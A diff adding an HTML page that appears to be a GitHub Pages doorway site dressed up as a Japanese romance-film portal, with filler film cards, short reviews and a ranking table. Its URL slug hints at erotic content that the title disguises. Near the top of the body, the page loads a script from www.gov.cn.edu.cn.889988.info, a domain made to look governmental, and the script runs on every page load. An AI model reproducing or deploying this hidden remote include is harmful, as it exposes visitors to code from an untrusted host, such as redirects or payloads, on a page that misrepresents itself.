@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>日本情情电影网 - 日本情感剧情影视在线观看</title>
+<meta name="description" content="日本情情电影网（ribenqingsedianyingwang-h5）专注日本纯爱、情感剧情类影视推荐与在线观看，感受细腻东瀛情感故事。网址 https://ribenqingsedianyingwang-h5.github.io">
+<meta name="keywords" content="日本情情电影网, 日本纯爱电影, 日本情感剧情片, 东瀛影视">
+<style>
+/* ===== 全局重置 ===== */
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+    font-family: "Georgia", "Microsoft YaHei", serif;
+    background: #f7f3ee;
+    color: #3a3a3a;
+    line-height: 1.8;
+}
+
+/* ===== 顶部 ===== */
+.topbar {
+    background: #2b2b2b;
+    color: #fff;
+    padding: 8px 20px;
+    font-size: 12px;
+    display: flex;
+    justify-content: space-between;
+}
+.topbar a { color: #ddd; margin-left: 15px; }
+
+/* ===== 头部 ===== */
+.site-header {
+    text-align: center;
+    padding: 50px 20px;
+    background: linear-gradient(135deg, #f5e6d3, #f0d4c8);
+    border-bottom: 1px solid #e0d0c0;
+}
+.site-header h1 {
+    font-size: 38px;
+    color: #8b4513;
+    letter-spacing: 3px;
+    font-weight: normal;
+}
+.site-header .sub {
+    font-size: 14px;
+    color: #a07050;
+    margin-top: 10px;
+    font-style: italic;
+}
+
+/* ===== 导航 ===== */
+.main-nav {
+    background: #fff;
+    border-bottom: 2px solid #8b4513;
+    padding: 12px 0;
+    text-align: center;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+}
+.main-nav a {
+    display: inline-block;
+    padding: 6px 22px;
+    margin: 0 5px;
+    color: #5a3a2a;
+    font-size: 15px;
+    border-radius: 20px;
+    transition: all 0.3s;
+}
+.main-nav a:hover {
+    background: #8b4513;
+    color: #fff;
+}
+
+/* ===== 容器 ===== */
+.wrap {
+    max-width: 1080px;
+    margin: 0 auto;
+    padding: 0 20px;
+}
+
+/* ===== 首屏 Banner ===== */
+.banner {
+    display: flex;
+    align-items: center;
+    gap: 40px;
+    padding: 60px 0;
+    border-bottom: 1px dashed #d0c0b0;
+}
+.banner-text { flex: 1; }
+.banner-text h2 {
+    font-size: 30px;
+    color: #6b3410;
+    margin-bottom: 15px;
+    font-weight: normal;
+}
+.banner-text p { color: #666; font-size: 15px; }
+.banner-img {
+    flex: 1;
+    border-radius: 12px;
+    overflow: hidden;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+}
+.banner-img img { width: 100%; display: block; }
+
+/* ===== 栏目标题 ===== */
+.sec-title {
+    text-align: center;
+    margin: 50px 0 30px;
+}
+.sec-title h2 {
+    font-size: 26px;
+    color: #8b4513;
+    font-weight: normal;
+    display: inline-block;
+    border-bottom: 2px solid #d4a574;
+    padding-bottom: 8px;
+}
+.sec-title span {
+    display: block;
+    font-size: 12px;
+    color: #a08070;
+    letter-spacing: 5px;
+    margin-top: 5px;
+}
+
+/* ===== 栏目一：推荐片单（横向卡片流） ===== */
+.film-flow {
+    display: flex;
+    overflow-x: auto;
+    gap: 20px;
+    padding: 10px 0 20px;
+    scroll-snap-type: x mandatory;
+}
+.film-flow::-webkit-scrollbar { height: 6px; }
+.film-flow::-webkit-scrollbar-thumb { background: #c0a080; border-radius: 3px; }
+.film-card {
+    min-width: 220px;
+    background: #fff;
+    border-radius: 8px;
+    overflow: hidden;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+    scroll-snap-align: start;
+}
+.film-card img { width: 100%; height: 280px; object-fit: cover; }
+.film-card .info { padding: 12px; }
+.film-card .info h3 { font-size: 16px; color: #5a3a2a; }
+.film-card .info p { font-size: 12px; color: #999; margin-top: 4px; }
+
+/* ===== 栏目二：分类导航（图标宫格） ===== */
+.cat-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+    gap: 15px;
+}
+.cat-item {
+    background: #fff;
+    border: 1px solid #e8d8c8;
+    border-radius: 8px;
+    padding: 25px 10px;
+    text-align: center;
+    transition: transform 0.3s;
+}
+.cat-item:hover { transform: translateY(-5px); border-color: #8b4513; }
+.cat-item .icon { font-size: 32px; margin-bottom: 8px; }
+.cat-item h3 { font-size: 14px; color: #6b3410; }
+
+/* ===== 栏目三：影评文章（左右交错） ===== */
+.article-list { display: flex; flex-direction: column; gap: 25px; }
+.article-item {
+    display: flex;
+    gap: 20px;
+    background: #fff;
+    padding: 20px;
+    border-radius: 8px;
+    align-items: center;
+}
+.article-item:nth-child(even) { flex-direction: row-reverse; }
+.article-item .thumb { width: 200px; height: 130px; border-radius: 6px; overflow: hidden; flex-shrink: 0; }
+.article-item .thumb img { width: 100%; height: 100%; object-fit: cover; }
+.article-item .txt h3 { color: #6b3410; font-size: 18px; margin-bottom: 6px; }
+.article-item .txt p { font-size: 13px; color: #777; }
+
+/* ===== 栏目四：排行榜（序号表格） ===== */
+.rank-table { width: 100%; border-collapse: collapse; background: #fff; border-radius: 8px; overflow: hidden; }
+.rank-table th, .rank-table td { padding: 14px 15px; text-align: left; border-bottom: 1px solid #f0e8e0; }
+.rank-table th { background: #8b4513; color: #fff; font-weight: normal; }
+.rank-table td:first-child { font-size: 20px; color: #c0a060; font-weight: bold; width: 50px; }
+.rank-table tr:hover td { background: #fdf8f2; }
+
+/* ===== 页脚 ===== */
+.site-footer {
+    background: #2b2b2b;
+    color: #ccc;
+    padding: 40px 20px 20px;
+    margin-top: 60px;
+    text-align: center;
+}
+.site-footer .foot-brand { font-size: 22px; color: #d4a574; margin-bottom: 10px; }
+.site-footer .foot-links a { color: #aaa; margin: 0 10px; font-size: 13px; }
+.site-footer .copyright { margin-top: 20px; font-size: 12px; color: #777; }
+
+/* ===== 移动端自适应 ===== */
+@media (max-width: 768px) {
+    .site-header h1 { font-size: 26px; }
+    .banner { flex-direction: column; padding: 30px 0; }
+    .banner-img { order: -1; }
+    .article-item, .article-item:nth-child(even) { flex-direction: column; }
+    .article-item .thumb { width: 100%; height: 180px; }
+    .main-nav a { padding: 5px 12px; font-size: 13px; }
+    .rank-table th:nth-child(3), .rank-table td:nth-child(3) { display: none; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- 顶部条 -->
+<div class="topbar">
+    <span>欢迎来到日本情情电影网 · 感受东瀛细腻情感</span>
+    <span><a href="#">登录</a><a href="#">注册</a></span>
+</div>
+
+<!-- 头部 -->
+<header class="site-header">
+    <h1>日本情情电影网</h1>
+    <p class="sub">情感 · 纯爱 · 剧情 —— 一帧一幕皆是心动</p>
+</header>
+
+<!-- 导航 -->
+<nav class="main-nav">
+    <a href="#home">首页</a>
+    <a href="#films">精选片单</a>
+    <a href="#cats">影片分类</a>
+    <a href="#articles">影评文章</a>
+    <a href="#rank">热播排行</a>
+    <a href="#about">关于我们</a>
+</nav>
+
+<!-- 首屏 -->
+<section class="wrap banner" id="home">
+    <div class="banner-text">
+        <h2>用影像，读懂日本的情感表达</h2>
+        <p>日本情情电影网（ribenqingsedianyingwang-h5）精选日本纯爱、情感剧情类影视作品，从昭和年代的胶片记忆到平成年代的细腻日常，带您感受最真挚的东瀛情感故事。网址：https://ribenqingsedianyingwang-h5.github.io</p>
+    </div>
+    <div class="banner-img">
+        <img src="https://picsum.photos/800/500?random=10" alt="日本情情电影网封面">
+    </div>
+</section>
+
+<!-- 栏目一：精选片单 -->
+<section class="wrap" id="films">
+    <div class="sec-title">
+        <h2>精选片单</h2>
+        <span>FEATURED FILMS</span>
+    </div>
+    <div class="film-flow">
+        <div class="film-card">
+            <img src="https://picsum.photos/300/400?random=11" alt="日本情情电影网推荐">
+            <div class="info"><h3>情书</h3><p>一封未曾寄出的信，一段无法忘怀的青春</p></div>
+        </div>
+        <div class="film-card">
+            <img src="https://picsum.photos/300/400?random=12" alt="日本情情电影网推荐">
+            <div class="info"><h3>恋空</h3><p>天空之下，我们的爱曾如此纯粹</p></div>
+        </div>
+        <div class="film-card">
+            <img src="https://picsum.photos/300/400?random=13" alt="日本情情电影网推荐">
+            <div class="info"><h3>花束般的恋爱</h3><p>百分百契合的灵魂，也会有走散的一天</p></div>
+        </div>
+        <div class="film-card">
+            <img src="https://picsum.photos/300/400?random=14" alt="日本情情电影网推荐">
+            <div class="info"><h3>东京爱情故事</h3><p>经典日剧，一代人的爱情启蒙</p></div>
+        </div>
+        <div class="film-card">
+            <img src="https://picsum.photos/300/400?random=15" alt="日本情情电影网推荐">
+            <div class="info"><h3>情牵一线</h3><p>命运交错的红线，牵动着两颗心</p></div>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目二：影片分类 -->
+<section class="wrap" id="cats">
+    <div class="sec-title">
+        <h2>影片分类</h2>
+        <span>CATEGORIES</span>
+    </div>
+    <div class="cat-grid">
+        <div class="cat-item"><div class="icon">🌸</div><h3>纯爱校园</h3></div>
+        <div class="cat-item"><div class="icon">🍃</div><h3>都市情感</h3></div>
+        <div class="cat-item"><div class="icon">🌊</div><h3>青春成长</h3></div>
+        <div class="cat-item"><div class="icon">🏯</div><h3>古装和风</h3></div>
+        <div class="cat-item"><div class="icon">🎌</div><h3>家庭伦理</h3></div>
+        <div class="cat-item"><div class="icon">🌙</div><h3>治愈系</h3></div>
+    </div>
+</section>
+
+<!-- 栏目三：影评文章 -->
+<section class="wrap" id="articles">
+    <div class="sec-title">
+        <h2>影评文章</h2>
+        <span>ARTICLES & REVIEWS</span>
+    </div>
+    <div class="article-list">
+        <article class="article-item">
+            <div class="thumb"><img src="https://picsum.photos/400/260?random=21" alt="影评配图"></div>
+            <div class="txt">
+                <h3>《情书》：岩井俊二的青春告白</h3>
+                <p>两个同名同姓的女孩，一封寄往天国的信，揭开了尘封多年的暗恋。日本情情电影网带您重温这部经典之作……</p>
+            </div>
+        </article>
+        <article class="article-item">
+            <div class="thumb"><img src="https://picsum.photos/400/260?random=22" alt="影评配图"></div>
+            <div class="txt">
+                <h3>《花束般的恋爱》：百分百的契合与渐行渐远</h3>
+                <p>当爱好不再同步，爱情是否还能维持原样？这部影片给出了最温柔也最残酷的答案。</p>
+            </div>
+        </article>
+        <article class="article-item">
+            <div class="thumb"><img src="https://picsum.photos/400/260?random=23" alt="影评配图"></div>
+            <div class="txt">
+                <h3>日本纯爱电影中的"物哀"美学</h3>
+                <p>从樱花凋零到季节更替，日本情感电影如何用自然意象表达转瞬即逝的爱意。</p>
+            </div>
+        </article>
+    </div>
+</section>
+
+<!-- 栏目四：热播排行 -->
+<section class="wrap" id="rank">
+    <div class="sec-title">
+        <h2>热播排行</h2>
+        <span>TOP RANKING</span>
+    </div>
+    <table class="rank-table">
+        <thead>
+            <tr><th>#</th><th>影片名称</th><th>类型</th><th>评分</th></tr>
+        </thead>
+        <tbody>
+            <tr><td>1</td><td>情书</td><td>纯爱 / 剧情</td><td>9.2</td></tr>
+            <tr><td>2</td><td>恋空</td><td>青春 / 纯爱</td><td>8.8</td></tr>
+            <tr><td>3</td><td>花束般的恋爱</td><td>都市 / 情感</td><td>8.6</td></tr>
+            <tr><td>4</td><td>近距离恋爱</td><td>校园 / 纯爱</td><td>8.3</td></tr>
+            <tr><td>5</td><td>今夜，在浪漫剧场</td><td>奇幻 / 爱情</td><td>8.1</td></tr>
+        </tbody>
+    </table>
+</section>
+
+<!-- 栏目五：关于我们 -->
+<section class="wrap" id="about">
+    <div class="sec-title">
+        <h2>关于我们</h2>
+        <span>ABOUT US</span>
+    </div>
+    <div style="background:#fff; padding:30px; border-radius:8px; border:1px solid #e8d8c8;">
+        <p style="margin-bottom:12px;"><strong>日本情情电影网</strong>（ribenqingsedianyingwang-h5）致力于打造一个专注日本情感、纯爱、剧情类影视的线上平台，为影迷精选最具代表性的东瀛爱情佳作。</p>
+        <p style="color:#888; font-size:13px;">网站地址：https://ribenqingsedianyingwang-h5.github.io</p>
+    </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="site-footer">
+    <div class="foot-brand">日本情情电影网</div>
+    <div class="foot-links">
+        <a href="#">首页</a><a href="#">精选片单</a><a href="#">影片分类</a><a href="#">影评文章</a><a href="#">热播排行</a>
+    </div>
+    <div class="copyright">© 2026 日本情情电影网 | 网站名称：日本情情电影网 | 网址：https://ribenqingsedianyingwang-h5.github.io</div>
+</footer>
+
+</body>
+</html>
